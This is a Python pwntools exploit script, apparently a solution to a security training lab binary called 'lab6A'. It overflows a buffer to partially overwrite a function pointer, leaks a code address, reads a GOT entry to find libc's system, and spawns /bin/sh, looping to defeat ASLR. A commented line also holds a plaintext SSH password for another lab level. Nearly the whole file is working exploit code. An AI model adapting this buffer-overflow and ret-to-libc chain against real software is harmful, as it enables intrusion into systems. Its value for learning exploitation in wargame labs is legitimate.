from pwn import *
import subprocess
import time
import signal
import os


exit_on_next_iter = False

def sigint_handler(signum, frame):
    global exit_on_next_iter
    term_gdb.kill()
    # os._exit(1)
    exit_on_next_iter = True
    exit()
 
signal.signal(signal.SIGINT, sigint_handler)


# context.terminal = ['tmux', 'splitw', '-h']

# IP = '172.16.70.133'
# PORT = 6642
# local = True
# if not local:
#     r = remote(IP, PORT)
# else:
#     r = process("./lab6A")

gdbscript_file = 'lab6A.gdb.txt'

#### Notes ####
# on my development machine I had a null byte in ebp
# so I added some gdb functions work around this
#### End ####

# f = open(gdbscript_file, 'w')
# f.write('''
# set follow-fork-mode child
# define stack
# x/64xw $esp
# end
# # break setup_account
# # break make_note
# # break write_wrap
# break *setup_account+162
# break *setup_account+271
# break *make_note+48
# continue
# x/64xw $esp
# ''')

# # print_name:    0x0be2
# # make_note:     0x09af  
# # print_listing: 0x09e0
# # write_wrap:    0x097a

# f.close()

# r.interactive()

def read_primitive(addr, base_address):
    # Call read address at address
    r.sendline('1')
    print r.read(200)
    r.sendline(p32(addr) + 'B'*26 + '\x00')
    print r.read(200)
    r.sendline('B'*92 + p16((base_address&0xf000)+0x097a) + '\x00')
    print r.read(200)
    r.sendline('3')
    resp = r.read(200)
    print resp
    print resp.encode('hex')
    return resp[:8]

def call_system_bin_sh(func_system):
    # Call read address at address
    r.sendline('1')
    print r.read(200)
    r.sendline("/bin/sh #" + 'C'*21 + '\x00')
    print r.read(200)
    r.sendline('C'*92 + p32(func_system) + '\x00')
    print r.read(200)
    r.sendline('3')
    # resp = r.read(200)
    # print resp
    # print resp.encode('hex')
    # return resp[:8]

max_iter = 32
i = 0
while (i < max_iter and exit_on_next_iter == False):
    try:
        r = process("./lab6A")
        # r = ssh('/levels/lab06/lab6C', '172.16.70.133', password='strncpy_1s_n0t_s0_s4f3_l0l', port=22)

        # term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6A" %d -x "%s"' % (r.pid, gdbscript_file)])
        # # print 'tmux splitw -h /usr/bin/gdb "./lab6B" %d -x "%s"' % (r.pid, gdbscript_file)
        # # term_gdb = subprocess.Popen(['tmux', 'splitw', '-h', '/usr/bin/gdb "./lab6B" %d -x "%s"' % (r.pid, gdbscript_file)])
        # time.sleep(1)

        print r.read(500)

        # Call print_name to leak the memory pointer
        r.sendline('1')         # Setup Account
        print r.read(200)
        r.sendline('A'*31)      # Fill user->name with 31 'A's
        print r.read(200)
        r.sendline('A'*90 + '\xe2\x0b\x00') # Fill the user->desc and overflow LSB bytes of print_name into LSB bytes of uinfo->sfunc
        print r.read(200)
        r.sendline('3')         # Trigger the sfunc which is now the print_name
        resp = r.read(200)
        print resp
        ptr32 = u32(resp[170:174])
        # print resp.encode('hex')
        print "0x%08x" % ptr32
        # r.interactive()

        # # Call print_name to leak the memory pointer
        # r.sendline('1')
        # print r.read(200)
        # r.sendline('A'*31)
        # print r.read(200)
        # r.sendline('A'*90 + p32(ptr32) + "A"*(128-94) + '\x00')
        # print r.read(200)
        # r.sendline('3')
        # resp = r.read(500)
        # print resp
        # # ptr32 = u32(resp[170:174])
        # print resp.encode('hex')
        # # print "0x%08x" % ptr32
        # # r.interactive()
        write_system_libc_offset = 0xa9b80  # native
        write_system_libc_offset = 0x9aac0  # vm

        write_got_address = ptr32 + 0x245a
        write_libc_address_bytes = read_primitive(write_got_address, ptr32)[:4]
        write_libc_address = u32(write_libc_address_bytes)
        system_libc_address = write_libc_address - write_system_libc_offset
        print write_libc_address_bytes.encode('hex')
        print "%x"%system_libc_address

        # term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6A" %d -x "%s"' % (r.pid, gdbscript_file)])
        # time.sleep(1)

        call_system_bin_sh(system_libc_address)

        # call_9a4_addr = (ptr32 & 0xfffff000) + 0x09a4
        # call_9a4_bytes = read_primitive(call_9a4_addr)
        # offset = u32(call_9a4_bytes[1:5])+5
        # write_plt = (call_9a4_addr-(0xffffffff-offset+1))
        # print "%x" % write_plt


        # call_9a4_addr = (ptr32 & 0xfffff000) + 0x09a4
        # print "0x%x" % call_9a4_addr
        # call_9a4_bytes = read_primitive(addr)
        # print call_9a4_bytes
        # offset = (call_9a4_bytes[1:5])+5
        # write_plt = (call_9a4_addr-(0xffffffff-offset+1))
        # print write_plt

        # # r.interactive()

        # # Call make_note which is vulnerable to stack overflow
        # r.sendline('1')
        # print r.read(200)
        # r.sendline('B'*30+'\x00')
        # print r.read(200)
        # r.sendline('B'*92 + p16((ptr32&0xf000)+0x09af) + '\x00')
        # print r.read(200)
        # r.sendline('3')
        # resp = r.read(200)  
        # print resp
        # print resp.encode('hex')

        # # Overflow make_note
        # # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE 
        # write_wrap = p32((ptr32&0xfffff000)+0x097a) 
        # # r.sendline('A'*40+'B'*12+'CCCC') 
        # r.sendline('/bin/sh\0'+'A'*32 + 'B'*12 + write_wrap)

        r.interactive()

    except:
        r.close()
    exit_on_next_iter == True
    i += 1

    # # Call print_name to leak the memory pointer
    # r.sendline('A'*40+'B'*16)
    # print r.read(200)

    # r.sendline()

    # r.interactive()

